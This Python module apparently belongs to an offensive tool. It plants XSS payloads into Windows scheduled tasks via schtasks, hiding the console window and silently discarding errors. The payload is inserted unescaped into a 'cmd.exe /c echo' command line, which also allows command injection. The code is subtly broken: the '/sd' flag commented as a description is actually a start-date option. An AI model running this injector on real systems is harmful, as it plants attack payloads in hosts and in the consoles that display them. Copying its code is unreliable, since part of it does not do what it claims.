"""Windows Scheduled Task XSS injection."""

import subprocess
from .base import BaseInjector
from ..payloads import XSSPayload


class ScheduledTaskInjector(BaseInjector):
    """Injects XSS payloads into Windows scheduled tasks."""
    
    def inject(self, payload: XSSPayload):
        """Create scheduled tasks with XSS payloads."""
        task_name = f"XSSTask_{payload.id}"
        
        try:
            # Create task with payload in command
            subprocess.run(
                [
                    "schtasks", "/create",
                    "/tn", task_name,
                    "/tr", f"cmd.exe /c echo {payload.content}",
                    "/sc", "ONCE",
                    "/st", "00:00",
                    "/f"
                ],
                capture_output=True,
                creationflags=subprocess.CREATE_NO_WINDOW
            )
            
            # Create task with payload in description
            task_name_desc = f"XSSTask_Desc_{payload.id}"
            subprocess.run(
                [
                    "schtasks", "/create",
                    "/tn", task_name_desc,
                    "/tr", "notepad.exe",
                    "/sc", "ONCE",
                    "/st", "00:00",
                    "/sd", f"XSS: {payload.content}",
                    "/f"
                ],
                capture_output=True,
                creationflags=subprocess.CREATE_NO_WINDOW
            )
        except Exception:
            pass
